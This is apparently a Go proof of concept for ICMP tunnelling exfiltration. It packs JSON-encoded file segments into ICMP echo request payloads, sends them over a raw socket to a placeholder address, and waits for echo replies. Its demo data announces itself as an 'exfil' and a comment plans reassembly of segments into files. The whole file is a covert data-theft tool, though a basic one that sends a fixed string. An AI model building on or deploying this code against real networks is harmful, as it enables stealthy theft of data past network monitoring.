package main

import (
  "os"
  "fmt"
  "log"
  "net"
  "time"
  "encoding/json"
  "golang.org/x/net/icmp"
  "golang.org/x/net/ipv4"
)

func main() {
  conn, err := net.Dial("ip4:icmp", "0.0.0.0")
  if err != nil {
    log.Fatal(fmt.Sprintf("Error connecting to server: %q",err))
  }
  ic := &IcmpClient{
    Conn:conn,
  }

  defer ic.Conn.Close()
  ic.SendFileSegment("payload.txt", 1, 1, []byte("Hello, ICMP file transfer,  It's an exfil!!!!!!!"))
  // Wait for a reply
  reply := make([]byte, 1500)
  ic.Conn.SetReadDeadline(time.Now().Add(5 * time.Second)) // 5 seconds timeout
  n, err := conn.Read(reply)
  if err != nil {
    log.Fatal(err)
  }
  parsedMsg, err := icmp.ParseMessage(1, reply[:n])
  if err != nil {
    fmt.Println(err)
    os.Exit(1)
  }
  // Check if it's an echo reply
  if parsedMsg.Type == ipv4.ICMPTypeEchoReply {
    fmt.Println("Received echo reply")
  } else {
    fmt.Printf("Got unexpected ICMP message: %v\n", parsedMsg)
  }
}

type FileSegment struct {
  Filename string `json:"filename"`
  SegmentID int `json:"segmentID"`
  //Segments to anticipate, store this an array and compile to a file when done
  TotalSegments int `json:"totalSegments"`
  Data []byte `json:"data"`
}

type IcmpClient struct{
  Conn net.Conn
}

func (ic *IcmpClient) SendFileSegment(filename string, segmentID, totalSegments int, data []byte) {
  segment := FileSegment{
    Filename: filename,
    SegmentID: segmentID,
    TotalSegments: totalSegments,
    Data: data,
  }
  encodedData, _ := json.Marshal(segment)
  msg := icmp.Message{
    Type: ipv4.ICMPTypeEcho, Code: 0,
    Body: &icmp.Echo{
      ID: os.Getpid() & 0xffff, Seq: 1,
      Data: encodedData,
    },
  }
  bin, _ := msg.Marshal(nil)
  ic.Conn.Write(bin)
  reply := make([]byte, 1500)
  ic.Conn.SetReadDeadline(time.Now().Add(5 * time.Second))
  n, _ := ic.Conn.Read(reply)
  parsedMsg, _ := icmp.ParseMessage(1, reply[:n])
  if parsedMsg.Type == ipv4.ICMPTypeEchoReply {
    fmt.Println("[+]  Received echo reply with random data")
  }
}
